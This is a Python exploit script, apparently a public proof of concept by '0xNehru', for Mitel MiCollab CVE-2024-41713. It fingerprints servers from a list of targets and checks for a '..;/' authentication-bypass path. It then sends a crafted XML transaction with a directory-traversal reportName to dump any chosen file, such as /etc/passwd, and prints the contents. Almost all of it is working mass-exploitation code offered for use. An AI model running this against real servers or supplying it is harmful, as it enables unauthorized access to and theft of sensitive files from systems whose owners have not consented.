import requests
import argparse

banner = """    
     ______         ___  ___________                   
  __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
  \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
   \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
    \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
              \\/          \\/     \\/                            

Mitel MiCollab CVE-2024-41713 Exploit
(*) Authentication Bypass & Arbitrary File Read Exploit by 0xNehru
"""

helptext = """
Example Usage:
  - python exploit.py --targets targets.txt --file /etc/passwd
"""

parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
parser.add_argument("--targets", help="File containing target URLs (one per line)", required=True, action="store")
parser.add_argument("--file", help="File to dump (e.g., /etc/passwd)", required=True, action="store")
args = parser.parse_args()

print(banner)

requests.urllib3.disable_warnings()

# Load target URLs from file
with open(args.targets, "r") as file:
    targets = [line.strip() for line in file.readlines()]

print(f"[*] Loaded {len(targets)} targets.")
print(f"[*] File to dump: {args.file}")

# Exploit payload
exploit_url_path = "/npm-pwg/..;/ReconcileWizard/reconcilewizard/sc/IDACall?isc_rpc=1&isc_v=&isc_tnum=2"
exploit_headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}
exploit_file_str = f'<transaction xmlns:xsi="http://www.w3.org/2000/10/XMLSchema-instance" xsi:type="xsd:Object"><transactionNum xsi:type="xsd:long">2</transactionNum><operations xsi:type="xsd:List"><elem xsi:type="xsd:Object"><criteria xsi:type="xsd:Object"><reportName>../../..{args.file}</reportName></criteria><operationConfig xsi:type="xsd:Object"><dataSource>summary_reports</dataSource><operationType>fetch</operationType></operationConfig><appID>builtinApplication</appID><operation>downloadReport</operation><oldValues xsi:type="xsd:Object"><reportName>x.txt</reportName></oldValues></elem></operations><jscallback>x</jscallback></transaction>'
exploit_data = {
    "_transaction": exploit_file_str,
    "protocolVersion": "1.0",
    "__iframeTarget__": "x"
}

# Iterate through targets
for target in targets:
    print(f"\n[+] Testing Target: {target}")

    try:
        # Verify if the target is a Mitel MiCollab server
        pre_check = requests.get(url=f'{target}/portal/', verify=False, timeout=10)
        if "MiCollab End User Portal" not in pre_check.text:
            print(f"[-] {target} is not a Mitel MiCollab server. Skipping.")
            continue

        # Check if the server is vulnerable
        vuln_check = requests.get(url=f'{target}/npm-pwg/..;/usp/', verify=False, timeout=10)
        if "<title>Search Users</title>" not in vuln_check.text:
            print(f"[-] {target} is Mitel MiCollab, but it is not vulnerable to CVE-2024-41713. Skipping.")
            continue

        # Exploit the vulnerability
        exploit_request = requests.post(
            url=f'{target}{exploit_url_path}',
            verify=False,
            headers=exploit_headers,
            data=exploit_data,
            timeout=10
        )

        # Display exploit result
        print(f"[+] {target} Exploit Successful! File Dump:")
        print(exploit_request.text)
    except Exception as e:
        print(f"[-] Error connecting to {target}: {e}")
